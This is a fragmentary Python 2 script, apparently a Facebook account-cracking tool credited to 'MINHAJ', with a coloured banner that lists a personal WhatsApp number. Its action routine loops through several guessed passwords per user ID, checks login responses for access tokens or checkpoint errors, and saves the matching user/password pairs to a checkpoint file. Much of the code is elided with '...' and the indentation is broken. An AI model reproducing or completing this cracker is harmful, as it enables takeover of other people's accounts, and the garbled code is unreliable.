...
"""
logo2 = """
\x1b[1;92m➣ NAME :           💗 MINHAJUL ISLAM 💗
\x1b[1;91m➣ PGE NAME :  💣TRUST💣
\x1b[1;93m➣ WHATSAPP NO :   👬 +8801985548104 👬
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;96m💖━━━━━━━━━💘💘💘(MAFIA-KILLER-MINHAJ)💘💘💘━━━━━━━━💖\n" 
...
def action():
	...
	if ahmad =='':
		...
		os.system('xdg-open https://youtube.com/channel/UCBoREhpSFGLOIfFa91WmeRQ')
		login()
	elif ahmad =='0':
		exb()
	else:
		...
		try:
			...
			if 'access_token' in q:
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;96m[MINHAJ-Checkpoint] ' + k + c + user + '  》  ' + pass1+'\n'
					...
					cpb.append(c+user+pass1)
 				    ...
 				    if 'access_token' in q:
 				        ...
 				        if 'www.facebook.com' in q['error_msg']:
 					        print '\033[1;96m[MINHAJ-Checkpoint] ' + k + c + user + '  》  ' + pass2+'\n'
 					        cps = open('save/checkpoint.txt', 'a')
 				            ...
 				            if 'access_token' in q:
 				                ...
 				                if 'www.facebook.com' in q['error_msg']:
 					                print '\033[1;96m[MINHAJ-Checkpoint] ' + k + c + user + '  》  ' + pass3+'\n'
 					                cps = open('save/checkpoint.txt', 'a')
 				                    ...
 				                    if 'access_token' in q:
 				                        ...
 				                        if 'www.facebook.com' in q['error_msg']:
 					                        print '\033[1;96m[MINHAJ-Checkpoint] ' + k + c + user + '  》  ' + pass4+'\n'
 					                        cps = open('save/checkpoint.txt', 'a')
